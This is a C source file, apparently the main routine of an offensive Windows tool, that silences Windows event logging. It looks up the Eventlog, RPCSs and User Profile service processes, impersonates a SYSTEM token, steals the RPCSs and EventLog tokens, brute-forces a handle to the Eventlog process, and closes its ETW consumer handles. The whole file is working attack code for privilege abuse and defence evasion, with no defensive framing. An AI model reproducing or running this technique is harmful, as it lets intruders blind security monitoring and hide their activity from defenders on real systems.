#include <Windows.h>
#include <stdio.h>
#include "EvtPsst.h"
#include "WmiGetService.h"
#include "Tokenstuff.h"
#include "Handlestuff.h"

void main() {
	
	DWORD dwSuccess = FAIL;
	DWORD dwPidEventlog = 0;
	DWORD dwPidRPCSs = 0;
	DWORD dwPidUserProfService = 0;
	

	
	HANDLE hProcessRPCSslow = NULL;
	HANDLE hProcessRPCSsduplicate = NULL;
	HANDLE hProcessEventlogduplicatequery = NULL;

	
	HANDLE hTokenSystem = NULL;
	HANDLE hTokenRPCSs = NULL;
	HANDLE hTokenEvtLog = NULL;

	
	PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
	DWORD dwHandleCount = 0;

	dwSuccess = getPidsfromService(&dwPidEventlog, &dwPidRPCSs, &dwPidUserProfService);

	if (dwSuccess == FAIL) {
		printf("[-] Could not get PIDs of all needed Services\n");
		goto exit;
	}
	else {
		printf("[+] Got all needed PIDs\n");
	}



	hProcessRPCSslow = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPidRPCSs);
	if (hProcessRPCSslow == NULL) {
		printf("[-] Could not open the RPCSs Process with low access\n");
		goto exit;
	}
	else {
		printf("[+] Could open RPCSs Process with low privileges\n");
	}

	
	hTokenSystem = ImpersonateTokenofPID(dwPidUserProfService);

	if (hTokenSystem == NULL) {
		printf("[-] Could not impersonate the token of the User Prof Service\n");
	}
	else {
		printf("[+] Could Impersonate token of System User\n");
	}

	dwSuccess = OpenProcessToken(hProcessRPCSslow, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTokenRPCSs);
	if (hTokenRPCSs == NULL) {
		printf("[-] Could not open the Process Token of the RPCSs Process\n");
		goto exit;
	}
	else {
		printf("[+] Got RPCSs Process Token\n");
	}
	dwSuccess = RevertToSelf();
	if (dwSuccess == FAIL) {
		printf("[-] Could not revert from system to admin context\n");
		goto exit;
	}


	dwSuccess = ImpersonateLoggedOnUser(hTokenRPCSs);
	if (dwSuccess == FAIL) {
		printf("[-] Could not impersonate Token of the RPCSs Service\n");
		goto exit;
	}
	else {
		printf("[+] Impersonated to RPCSs Token\n");
	}


	dwSuccess = DuplicateHandle(GetCurrentProcess(), hProcessRPCSslow, GetCurrentProcess(), &hProcessRPCSsduplicate, PROCESS_DUP_HANDLE, FALSE, 0);
	if (dwSuccess == FAIL) {
		printf("[-] Could not duplicate the low Handle of RPCSs into a process handle with PROCESS_DUP_HANDLE Access\n");
		goto exit;
	}
	else {
		printf("[+] Duplicated the low Handle of RPCSs into a process handle with PROCESS_DUP_HANDLE Access\n");
	}

	pHandleInfo = getHandleInfos();
	if (pHandleInfo == NULL) {
		printf("Could not get Handle Informations\n");
		goto exit;
	}
	else {
		printf("[+] Got Handle Information\n");
	}
	
	dwSuccess = GetEventLogToken(pHandleInfo, dwPidRPCSs, dwPidEventlog, &hTokenEvtLog, hProcessRPCSsduplicate);
	if (dwSuccess == FAIL) {
		printf("Could not get the token of the EventLog Process\n");
		goto exit;
	}
	else {
		printf("[+] Got Eventlog Token\n");
	}

	
	dwSuccess = BruteForcewithEventLogToken(pHandleInfo, hTokenEvtLog, hTokenRPCSs, dwPidEventlog, dwPidRPCSs, hProcessRPCSsduplicate, &hProcessEventlogduplicatequery);
	if (dwSuccess == FAIL) {
		printf("Could not successfully bruteforce the handle with the token\n");
		goto exit;
	}
	else {
		printf("[+] Successfully bruteforced the process handle of the Eventlogprocess with the EventLog Token\n");
	}
	

	dwSuccess = CloseETWConsumerHandle(pHandleInfo, dwPidEventlog, hTokenEvtLog, hProcessEventlogduplicatequery);
	if (dwSuccess == FAIL) {
		printf("[-] Could not find / close all ETW Consumer handles\n");
	}
	else {
		printf("[+] Could close all ETW Consumer handles\n");
	}


exit:
	if (hProcessRPCSslow) {
		CloseHandle(hProcessRPCSslow);
	}
	if (hTokenSystem) {
		CloseHandle(hTokenSystem);
	}
	if (hTokenRPCSs) {
		CloseHandle(hTokenRPCSs);
	}
	if (hProcessRPCSsduplicate) {
		CloseHandle(hProcessRPCSsduplicate);
	}
	if (pHandleInfo) {
		VirtualFree(pHandleInfo, 0, MEM_RELEASE);
	}
	if (hTokenEvtLog) {
		CloseHandle(hTokenEvtLog);
	}
	if (hProcessEventlogduplicatequery) {
		CloseHandle(hProcessEventlogduplicatequery);
	}

	return;

}